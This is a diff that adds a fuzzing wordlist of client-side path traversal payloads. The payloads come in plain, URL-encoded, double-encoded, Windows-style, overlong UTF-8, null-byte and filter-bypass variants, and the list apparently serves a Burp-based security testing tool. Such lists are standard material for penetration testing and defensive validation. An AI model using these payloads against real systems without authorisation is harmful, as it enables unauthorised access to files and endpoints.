@@ -1,0 +1,60 @@
+# Client-Side Path Traversal (CSPT) Payloads
+# Reference: https://github.com/doyensec/CSPTBurpExtension
+
+# Basic path traversal
+../
+../../
+../../../
+../../../../
+../../../../../
+
+# URL encoded
+..%2f
+..%2F
+%2e%2e/
+%2e%2e%2f
+%2E%2E%2F
+
+# Double URL encoded
+..%252f
+..%252F
+%252e%252e/
+%252e%252e%252f
+
+# Multiple traversal
+....//
+....//....//
+....//....//....//
+..../
+....\/
+
+# Windows style
+..\
+..\\
+..%5c
+..%5C
+%2e%2e\
+%2e%2e%5c
+
+# Unicode/UTF-8 encoded
+..%c0%af
+..%c1%9c
+%c0%ae%c0%ae/
+
+# Null byte injection (legacy)
+../\x00
+..%00/
+%00../
+
+# Mixed encoding
+..%2f..%2f
+%2e%2e/%2e%2e/
+..%c0%af..%c0%af
+
+# Bypass patterns
+....//....//
+..././
+..;/
+..%00/
+/..\..\..\
+/..%5c..%5c
